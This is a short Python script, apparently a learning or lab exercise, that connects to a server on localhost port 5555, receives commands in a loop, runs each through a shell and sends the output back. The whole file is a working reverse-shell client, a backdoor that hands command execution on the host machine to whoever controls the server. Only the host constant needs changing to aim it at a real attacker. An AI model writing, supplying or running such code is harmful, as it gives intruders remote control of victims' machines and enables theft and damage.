import sys
import socket
import subprocess

HOST = 'localhost'
PORT = 5555

s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[*] received: {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    #if cmd.lower() in []

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        result = str(e.output).encode()
    except Exception as e:
        result = str(e).encode()

    s.send(result)

s.close()
